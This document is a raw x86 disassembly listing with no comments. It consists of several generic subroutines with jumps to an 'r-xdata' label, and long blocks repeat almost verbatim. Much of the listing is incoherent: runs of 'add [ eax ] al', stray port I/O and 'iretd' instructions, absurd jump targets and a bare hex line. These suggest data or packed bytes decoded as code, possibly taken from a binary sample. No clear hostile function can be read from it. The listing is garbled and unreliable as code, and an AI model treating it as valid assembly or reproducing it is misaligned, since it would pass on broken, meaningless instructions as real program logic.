ja r-xdata
jge 0xffffffff9c95c9b2
jo 0xffffffffa2c13bc5
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
jae r-xdata
je 0xffffffffff6db0f5
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402d2a
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b235
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402a5a
pop eax
jne r-xdata
jne r-xdata
sub edi 0xfeb2810f
pop eax
jge r-xdata
jge 0xffffffffffa2ad06
pop ecx
jns r-xdata
jno 0xffffffff874f5fb9
jg r-xdata
jo 0xffffffffcbc1a91b
ja r-xdata
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jg r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jge r-xdata
call [ 0xffffffffca81677d ]
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
push ecx
push edx
push ebp
sub esp 0x4
call sub_402a1d
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b152
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1e7e1
jne r-xdata
or edx 0xf3812e79
push ebp
pushfd
call sub_402a5a
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
add ecx 0xaa890f
add [ eax ] al
jg r-xdata
xor esi 0x25ffca77
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffca2f0
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16840
jge 0x71fc6959
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
add [ ecx + 0x42850fe2 ] 0xffffffff
pushfd
push esi
call sub_402a51
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402b6b
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
div [ eax ]
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacba7e
jae r-xdata
ja 0xffffffffa3c33a16
jae r-xdata
ja 0xffffffff89a466b7
ja r-xdata
xor ebx 0xff3d870f
call sub_4029cd
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdeaffc
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
pop edx
pop edx
jae r-xdata
jmp 0xffffffffff79ab14
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402deb
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jg r-xdata
add eax 0x5abb2979
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93474
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_402a7d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f030
jg r-xdata
ja 0xcaae2c
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44f25f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48ef36
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bacd3
pop edx
jge r-xdata
jo 0xffffffff854f8525
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44efeb
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcfd2a
jae r-xdata
call sub_402be2
jb 0xffffffff81b2a898
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa046
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0b069
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd3c6d
add esp 0x4
jae r-xdata
jl 0xf3adae
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402a88
jae 0xffffffffff43b2ad
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f84a7
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe8917f44
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b008
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586621fd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428a523
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
jo 0xffffffffa2c13bc5
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
jae r-xdata
je 0xffffffffff6db0f5
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402d2a
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b235
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402a7d
add esp 0x4
jae r-xdata
push ecx
push ebx
push ecx
call sub_402b7a
xor ebx 0xff1a830f
jo 0x559681e0
call sub_402b6b
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c33a16
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9bacd3
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48ef36
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeaffc
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_402be2
jb 0xffffffff81b2a898
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93474
add esp 0x4
jae r-xdata
jl 0xf3adae
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f030
jg r-xdata
ja 0xcaae2c
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f84a7
pop edx
jge r-xdata
jo 0xffffffff854f8525
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44efeb
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe8917f44
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa046
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacba7e
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
div [ eax ]
inc eax
add [ ebx + 0x5a5928ec ] al
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428a523
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_402a88
jae 0xffffffffff43b2ad
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6db0f5
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402deb
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_402a7d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158b008
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44f25f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffcfd2a
jno r-xdata
jge 0xffffffffffa0b069
jge r-xdata
jpe 0x74cd3c6d
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586621fd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
jo 0xffffffffa2c13bc5
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402d2a
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b235
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402a88
push esp
push edi
push esi
push ebp
call sub_402b6b
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c33a16
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9bacd3
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48ef36
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeaffc
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_402be2
jb 0xffffffff81b2a898
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93474
add esp 0x4
jae r-xdata
jl 0xf3adae
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f030
jg r-xdata
ja 0xcaae2c
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f84a7
pop edx
jge r-xdata
jo 0xffffffff854f8525
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44efeb
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe8917f44
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa046
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacba7e
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
div [ eax ]
inc eax
add [ ebx + 0x5a5928ec ] al
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428a523
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_402a88
jae 0xffffffffff43b2ad
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6db0f5
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402deb
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_402a7d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158b008
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44f25f
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffcfd2a
jno r-xdata
jge 0xffffffffffa0b069
jge r-xdata
jpe 0x74cd3c6d
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586621fd
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
jo 0xffffffffa2c13bc5
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402d2a
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b235
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402b6b
jg r-xdata
jne r-xdata
and eax 0xae830f
add [ eax ] al
jae r-xdata
and esi 0x89641273
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48ef36
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeaffc
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_402be2
jb 0xffffffff81b2a898
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
xor al [ ecx ]
add [ eax ] al
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93474
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f030
jg r-xdata
ja 0xcaae2c
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop edx
jge r-xdata
jo 0xffffffff854f8525
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44efeb
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa046
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c33a16
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacba7e
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
div [ eax ]
inc eax
add [ ebx + 0x5a5928ec ] al
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_402a88
jae 0xffffffffff43b2ad
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
or esi 0xff24810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402deb
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_402a7d
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158b008
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jg r-xdata
